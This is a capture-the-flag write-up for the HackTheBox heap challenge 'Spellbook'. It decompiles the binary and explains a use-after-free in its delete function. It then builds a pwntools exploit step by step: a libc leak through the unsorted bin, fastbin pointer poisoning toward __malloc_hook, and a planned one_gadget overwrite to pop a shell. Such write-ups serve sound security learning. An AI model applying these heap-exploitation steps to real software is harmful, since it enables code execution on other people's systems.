SpellBook - HackTheBox

December 3, 2022 · 6 min read
zexion
Author of the blog
  • Category: Pwn
  • Status: Retired

Description​

Spellbook is a medium rated challenge from HackTheBox. Its a classic heap challenge where you have add, edit, delete and show functions. On delete function, the free'd chunk is not being nulled, which leads to use-after-free case and a heap overflow in edit function Not used in this exploit

Decompilation​

The main function looks like:

int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax

  setup();
  banner();
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        v3 = menu();
        if ( v3 != 2 )
          break;
        show();
      }
      if ( v3 > 2 )
        break;
      if ( v3 != 1 )
        goto LABEL_13;
      add();
    }
    if ( v3 == 3 )
    {
      edit();
    }
    else
    {
      if ( v3 != 4 )
      {
LABEL_13:
        printf("\n%s[-] You are not a wizard! You are a muggle!\n\n", "\x1B[1;31m");
        exit(22);
      }
      delete();
    }
  }
}

add function:

void __fastcall add()
{
  int size; // [rsp+4h] [rbp-5Ch]
  size_t idx; // [rsp+8h] [rbp-58h]
  spl *spell; // [rsp+10h] [rbp-50h]

  printf(format);
  idx = read_num();
  if ( idx <= 9 )
  {
    spell = (spl *)malloc(0x28uLL);
    printf(aInsert);
    spell->type[(int)(read(0, spell, 0x17uLL) - 1)] = 0;
    printf(aInsert_0);
    size = read_num();
    if ( size <= 0 || size > 1000 )
    {
      printf("\n%s[-] Such power is not allowed!\n", "\x1B[1;31m");
      exit(290);
    }
    spell->power = size;
    spell->sp = (char *)malloc(spell->power);
    printf(aEnter);
    spell->sp[(int)read(0, spell->sp, size - 1) - 1] = 0;
    table[idx] = spell;
    printf(aS_0, "\x1B[1;32m", "\x1B[1;34m");
  }
  else
  {
    printf(aS, "\x1B[1;31m", "\x1B[1;34m");
  }
}

Summary:

  • Can allocate upto 10 chunks
  • Maximum size for the chunk is 1000

show function:

void __fastcall show()

There is also a format string vulnerability, which can be used to get libc leak, but i'll be doing with unsorted bin.

edit function:

void __fastcall edit()
{
  size_t idx; // [rsp+8h] [rbp-18h]
  spl *new_spell; // [rsp+10h] [rbp-10h]

  printf(format);
  idx = read_num();

    printf(aNew_0);

    printf(aS_1, "\x1B[1;32m", "\x1B[1;34m");

The bug lies at the following line, again not using the vulnerability.

new_spell->type[(int)(read(0, new_spell->sp, 0x1FuLL) - 1)] = 0;

and finally delete function:

void __fastcall delete()
{
  size_t idx; // [rsp+8h] [rbp-18h]
  spl *ptr; // [rsp+10h] [rbp-10h]

  printf(format);
  idx = read_num();
  if ( idx <= 9 && table[idx] )
  {
    ptr = table[idx];
    free(ptr->sp);
    free(ptr);
    printf(aS_2, "\x1B[1;32m", "\x1B[1;34m");
  }
  else
  {
    printf(aS, "\x1B[1;31m", "\x1B[1;34m");
  }
}

Here lies the bug that I'll be exploiting to pop a shell. It frees ptr->sp and ptr, but doesn't nulls it out, leading to use-after-free.

Exploit​

wrapper for calling the functions in python.

exploit.py
from pwn import *
import sys

e = ELF("./spellbook")
libc = e.libc
try:
    host,port = sys.argv[1].split(":")
    p = remote(host,port)
except:
    p = e.process()

c = lambda x: p.sendlineafter(b">> ", str(x).encode())

def add(entry, types, power, data, shell=False):
    c(1)
    p.sendlineafter(b"entry: ", str(entry).encode())
    if shell:
        return
    p.sendlineafter(b"type: ", types)
    p.sendlineafter(b"power: ", str(power).encode())
    p.sendlineafter(b": ", data)

def show(idx):
    c(2)
    p.sendlineafter(b"entry: ", str(idx).encode())
    p.recvuntil(b"       : ")
    return p.recvuntil(b"\n", drop=True)

def edit(idx, types, data):
    c(3)
    p.sendlineafter(b"entry: ", str(idx).encode())
    p.sendlineafter(b"type: ", types)
    p.sendlineafter(b": ", data)

def free(idx):
    c(4)
    p.sendlineafter(b"entry: ", str(idx).encode())

#gdb.attach(p)
p.interactive()

Let's get a unsorted bin leak and then move on with the actual exploit. Create a maximum size of a chunk that the program allows, create another to prevent top chunk consolidation.

exploit.py
add(0, b"X", 0x3e8, b"A")
add(1, b"X", 0x10, b"B")

free(0)

gdb.attach(p)
p.interactive()

Since there's use-after-free, we can view the idx 0 chunk to get a leak, and calculate libc's base address,

exploit.py
libc_leak = u64(show(0) + b"\x00\x00")
log.info(f"libc leak : { hex(libc_leak)} ")
libc.address = libc_leak - 0x3c4b78
log.info(f"libc base leak : { hex(libc.address)} ")

gdb.attach(p)
p.interactive()

Now we've defeated ASLR, we need to get a rce. Because of use-after-free, we can actually change the fd of the already free'd chunk to somewhere else. For now, I'll be changing the address to 0xdeadbeef. Let's setup similar scenario first.

exploit.py
add(2, b"X", 0x48, b"a")
add(3, b"X", 0x48, b"b")

free(2)
free(3)

Since we can still edit the Chunk 1's FD, try to change it to somewhere else.

exploit.py
edit(3, b"", p64(0xdeadbeef))

Now we can overwrite __free_hook with one_gadget, but that won't work since there is a size check in fastbins, https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3319. So we need to find a address before either of the hook whose size is similar to the size of the bin. The simple way is to find a size of 0x7f, do the exploit in the size of 0x68 which will be in

[0x70]: Chunk 2 -> __free_hook

Now generally there are no 0x7f fake size chunks before __free_hook but there are before __malloc_hook, so we'll be allocating before __malloc_hook

exploit.py
add(2, b"X", 0x68, b"a")
add(3, b"X", 0x68, b"b")

free(2)
free(3)

edit(3, b"", p64(libc.address + 0x3c4aed))

Bring to the head,

exploit.py
add(5, b"X", 0x68, b"B")

And now we allocate from the address, and overwrite with one_gadget ( can use system but one_gadget is life saver ).
